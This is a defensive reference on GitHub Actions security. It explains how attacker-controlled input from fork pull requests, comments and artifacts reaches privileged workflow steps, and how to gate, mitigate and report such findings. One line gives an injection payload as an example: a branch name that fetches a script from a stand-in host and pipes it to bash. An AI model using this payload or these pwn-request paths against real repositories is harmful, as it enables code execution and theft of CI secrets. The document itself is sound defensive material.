# Untrusted triggers and pwn requests

Technical reference snapshot dated 2026-11-17. Verify current GitHub trigger and token semantics before relying on exact platform behavior. Use this reference to trace how untrusted input reaches privileged workflow steps and to report a security finding.

## Attacker-controlled data

- Anyone can open fork PRs, issues, comments, reviews and discussions on a public repository. Without write access they cannot push, run `workflow_dispatch` or change `schedule` workflows.
- Attacker-controlled values: PR title, body, head ref and label, branch names, changed file paths, commit messages and author names and emails, issue, comment, review and discussion text, wiki page names, `github.event.workflow_run.head_branch`, artifacts from PR runs, and every file in a PR checkout.
- Branch names cannot contain spaces, yet `dev$({curl,-sSfL,evil.example}${IFS}|${IFS}bash)` is a valid branch name. Email addresses can contain backticks.
- Safe as plain values: numeric IDs, SHAs, `github.repository`, `github.repository_owner`, `secrets.*`.
- Injection through `workflow_dispatch` inputs or pushes to protected branches needs write access, so it is not an outside-attacker finding.

## pull_request_target

- It runs the workflow file and checkout ref of the default branch, with secrets and a write-capable token. Since 2025-12-08 the PR's base branch no longer matters, so fixing the workflow on the default branch fixes every PR.
- A pwn request checks out the PR head or merge commit and then runs anything from it: install scripts (npm lifecycle scripts, `setup.py`, Go `init()`), builds, tests, Makefiles, linters that load config, or `uses: ./...` actions from that checkout.
- `actions/checkout@v7` refuses fork PR heads, `refs/pull/N/head`, `refs/pull/N/merge` and `repository:` set to the fork in `pull_request_target` and in `workflow_run` runs started by a PR. Floating majors `@v2` to `@v6` received the check on 2026-07-20 (v2.8.0 to v6.1.0). `@v1`, SHA pins and older exact versions did not.
- `allow-unsafe-pr-checkout: true` turns the refusal off. Use it only when the job treats the files as data: check out into `path: pr`, run nothing from it, and keep the token read-only.
- The checkout guard does not cover `git fetch`, `gh pr checkout`, downloaded artifacts, other repositories, or `issue_comment` workflows.
- Restrict a job to same-repository PRs with `github.event.pull_request.head.repo.full_name == github.repository`. Checking `github.repository_owner` blocks nothing, since it always names the base repository.
- `[skip ci]` in a commit message does not stop `pull_request_target`, and the event runs even when the PR has merge conflicts.

## workflow_run

- It runs on the default branch with secrets and write tokens even when the upstream run had neither. A fork PR can edit or rename its copy of the upstream workflow so that the name matches and its completion fires the privileged workflow.
- Before privileged steps, check `github.event.workflow_run.event` and `github.event.workflow_run.head_repository.full_name`, and set `branches:` on the trigger.
- Treat upstream artifacts as hostile. Download them to `${{ runner.temp }}`, not the workspace, parse them as data, validate numbers as numbers, and never source, execute or interpolate them into `run:`. Downloading needs `run-id`, `github-token` and `actions: read`.

## Comment and label gates

- `issue_comment` runs on the default branch with secrets for any commenter. Require `github.event.comment.author_association` to be `OWNER`, `MEMBER` or `COLLABORATOR` before acting on a command, and never keep a hard-coded list of usernames.
- Gates are time-of-check to time-of-use races. After a maintainer approves, the author can push new commits. Act on the approved `github.event.pull_request.head.sha`, never `head.ref`.
- The `labeled` activity of `pull_request_target` carries the head SHA. An `issue_comment` payload carries only the PR number, so resolving the head later reopens the race. Checking the commenter does not help, because the approver is not the author of the later commit. Commit dates are forgeable.

## Platform controls

- Workflow execution protections (GA 2026-09-17) are ruleset-based actor and event rules at enterprise, organization or repository level, with workflow file targeting. Use them to restrict `workflow_dispatch` to maintainers or block `pull_request_target`, and run them in evaluate mode first.
- Require approval for workflow runs from all outside contributors. Runs waiting more than 30 days expire as failed. GitHub also holds runs it flags as potentially malicious in public repositories until a collaborator with write access approves them in the web UI.
- Self-hosted runners persist between jobs. Untrusted code can leave processes or cron jobs, read credentials from earlier jobs and see other jobs' command-line arguments with `ps`. Use just-in-time runners (`./run.sh --jitconfig`) on clean machines and separate runner groups for trusted workflows.
- CodeQL default setup scans workflows for these patterns, and `zizmor --persona=auditor .` adds lower-confidence findings to the regular audit.

## Reporting a finding

- Trace the full path: trigger, the `if:` gates that must pass, the sink (`run:`, `script:`, an agent prompt, or checkout followed by execution), and what the token, secrets and caches in that job allow.
- Drop the finding when any link breaks. Report a partial path as needing verification.
